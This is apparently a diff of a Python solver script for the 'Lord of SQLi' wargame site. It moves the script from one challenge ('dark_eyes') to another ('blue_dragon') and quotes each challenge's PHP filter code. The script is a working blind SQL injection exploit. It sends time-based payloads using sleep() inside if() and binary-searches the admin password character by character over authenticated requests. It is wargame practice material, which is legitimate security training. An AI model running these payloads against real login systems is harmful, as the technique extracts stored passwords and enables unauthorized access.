@@ -2,30 +2,33 @@
 import pickle
 import los
 from getpass import getpass
+import time
 
 
-def check_func(response: str) -> bool:
-    return 'select id from prob_dark_eyes' in response
+def check_func(response: str, time_1, time_2) -> bool:
+    return time_2 - time_1 > 2
 
 
 def main():
     '''
-    Dark_eyes
+    Blue_dragon
 
-    if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
-    if(preg_match('/col|if|case|when|sleep|benchmark/i', $_GET[pw])) exit("HeHe");
-    $query = "select id from prob_dark_eyes where id='admin' and pw='{$_GET[pw]}'";
-    $result = @mysqli_fetch_array(mysqli_query($db,$query));
-    if(mysqli_error($db)) exit();
+    if(preg_match('/prob|_|\./i', $_GET[id])) exit("No Hack ~_~");
+    if(preg_match('/prob|_|\./i', $_GET[pw])) exit("No Hack ~_~");
+    $query = "select id from prob_blue_dragon where id='{$_GET[id]}' and pw='{$_GET[pw]}'";
     echo "<hr>query : <strong>{$query}</strong><hr><br>";
+    $result = @mysqli_fetch_array(mysqli_query($db,$query));
+    if(preg_match('/\'|\\\/i', $_GET[id])) exit("No Hack ~_~");
+    if(preg_match('/\'|\\\/i', $_GET[pw])) exit("No Hack ~_~");
+    if($result['id']) echo "<h2>Hello {$result[id]}</h2>";
 
     $_GET[pw] = addslashes($_GET[pw]);
-    $query = "select pw from prob_dark_eyes where id='admin' and pw='{$_GET[pw]}'";
+    $query = "select pw from prob_blue_dragon where id='admin' and pw='{$_GET[pw]}'";
     $result = @mysqli_fetch_array(mysqli_query($db,$query));
-    if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("dark_eyes");
+    if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("blue_dragon");
     '''
 
-    url = "https://los.rubiya.kr/chall/dark_eyes_4e0c557b6751028de2e64d4d0020e02c.php"
+    url = "https://los.rubiya.kr/chall/blue_dragon_23f2e3c81dca66e496c7de2d63b82984.php"
 
     try:
         with open('cooks.pickle', 'rb') as f:
@@ -38,7 +41,7 @@ def main():
         print('you need to login in browser')
         exit(1)
 
-    payload = "'||id='admin'&&(select 1 union select (length(pw)>%s))#"
+    payload = "' or id='admin' and if(length(pw)>%s,sleep(3),0)#"
     param = dict(pw=payload)
     len_of_key = los.find_key_len(url, param, check_func, cook)
 
@@ -47,7 +50,7 @@ def main():
     result = ''
     num_of_requests = 0
     for i in range(1, len_of_key + 1):
-        payload = f"'||id='admin'&&(select 1 union select (ord(mid(pw,{i},1))<%s))#"
+        payload = f"' or id='admin' and if(ord(mid(pw,{i},1))<%s,sleep(3),0)#"
         param = dict(pw=payload)
         left, num_requests = los.find_binary(url, param, check_func,
                                              32, 127, cook)
@@ -57,11 +60,11 @@ def main():
 
     print('num_of_requests:', num_of_requests)
 
-    param = dict(pw=result)
+    param = {'id': 'admin', 'pw': result}
     response = los.get_request(url, param, cook)
 
     if 'Clear!' in response:
-        print('Dark_eyes Clear!')
+        print('Blue_dragon Clear!')
 
     # Save cookie
     los.save_cookies(cook)
